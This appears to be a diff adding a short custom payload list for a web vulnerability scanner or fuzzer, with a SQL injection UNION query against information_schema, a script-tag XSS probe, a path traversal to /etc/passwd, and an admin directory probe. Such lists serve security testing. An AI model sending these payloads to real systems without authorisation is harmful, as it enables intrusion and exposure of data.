@@ -1,0 +1,6 @@
+#Add custom payloads below this line
+AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1
+search=<script>alert(1)</script>
+file=../../../../etc/passwd
+/Admin_Files/
+q=<invalid>foobar
